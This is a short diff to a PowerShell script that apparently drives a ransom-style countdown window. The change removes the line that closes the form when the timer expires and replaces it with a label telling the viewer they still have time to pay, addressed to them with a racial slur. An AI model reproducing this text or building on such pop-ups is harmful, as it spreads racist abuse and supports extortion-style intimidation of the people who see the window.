@@ -120,8 +120,11 @@ $form.Add_Shown({
         Start-Sleep 1
         $timer--
     }
-    $form.Close()
+    # Instead of closing, just update the label when timer hits 0
+    $timerLabel.Text = "you still got time to pay nigger!"
+    $timerLabel.ForeColor = "Orange"
 })
+
 
 [void]$form.ShowDialog()
 
